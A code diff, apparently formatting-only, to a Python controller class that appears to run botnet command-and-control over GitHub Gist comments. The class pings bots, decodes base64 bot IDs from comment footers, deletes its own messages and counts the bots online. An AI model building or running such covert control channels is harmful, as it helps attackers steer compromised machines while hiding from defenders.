@@ -17,9 +17,7 @@ class Controller:
         self.response_thread = threading.Thread(
             target=self.receive_responses, daemon=True
         )
-        self.ping_thread = threading.Thread(
-            target=self.ping_bots, daemon=True
-        )
+        self.ping_thread = threading.Thread(target=self.ping_bots, daemon=True)
         self.last_ping = None
 
         self.bots = {}
@@ -36,8 +34,10 @@ class Controller:
             sleep(2)
 
     def handle_response(self, response: GistComment):
-        response_footer = response.body[response.body.rfind("["):]
-        response_id = base64.b64decode(response_footer.split("(")[1].split(")")[0].encode('utf-8')).decode('utf-8')
+        response_footer = response.body[response.body.rfind("[") :]
+        response_id = base64.b64decode(
+            response_footer.split("(")[1].split(")")[0].encode("utf-8")
+        ).decode("utf-8")
 
         if Channel.PING_RESPONSE in response.body:
             self.bots[response_id.split("-")[1]] = int(response_id.split("-")[0])
@@ -49,9 +49,7 @@ class Controller:
             if self.last_ping:
                 self.channel.delete_message(self.last_ping)
 
-            self.last_ping = self.channel.send_message(
-                f"{Channel.PING_REQUEST}"
-            ).id
+            self.last_ping = self.channel.send_message(f"{Channel.PING_REQUEST}").id
 
             sleep(60)
 
@@ -73,4 +71,6 @@ class Controller:
             self.channel.delete_message(self.last_ping)
 
     def print_status(self):
-        print(f"Bots currently online: {len([x for x, y in self.bots.items() if y == self.last_ping])}")
+        print(
+            f"Bots currently online: {len([x for x, y in self.bots.items() if y == self.last_ping])}"
+        )
